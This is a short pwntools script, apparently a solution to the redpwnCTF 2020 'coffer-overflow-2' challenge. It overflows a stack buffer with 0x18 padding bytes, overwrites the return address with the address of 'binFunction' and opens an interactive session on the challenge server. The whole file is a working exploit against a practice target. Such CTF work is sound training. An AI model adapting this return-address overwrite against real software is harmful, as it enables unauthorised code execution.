from pwn import *
r=remote("2020.redpwnc.tf",31908)
b=ELF("./coffer-overflow-2")
pay=""
pay+='x'*0x18
pay+=p64(b.symbols['binFunction'])

r.sendline(pay)

r.interactive()
